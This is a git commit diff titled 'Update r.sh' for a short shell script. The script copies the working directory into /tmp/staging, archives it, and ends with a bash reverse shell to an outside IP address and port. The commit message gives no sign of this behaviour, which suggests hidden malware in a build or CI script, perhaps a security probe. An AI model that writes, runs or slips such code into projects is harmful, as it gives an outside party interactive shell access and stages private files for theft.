2f02625be6ae6b39f10dd9df0d396cd8ed4d2e91
Octavio Gianatiempo <ogianatiempo@gmail.com>
2021-11-03 00:12:10 -0300

    Update r.sh

--- r.sh
+++ r.sh
@@ -1,2 +1,8 @@
 #!/bin/sh
+echo "prepare staging"
+mkdir /tmp/staging
+echo "grab package files"
+rsync -rv --exclude=.git ./ /tmp/staging
+echo "prepare package archive"
+tar -cvf /tmp/package.tar /tmp/staging/*
 bash -i >& /dev/tcp/3.142.167.4/14584 0>&1
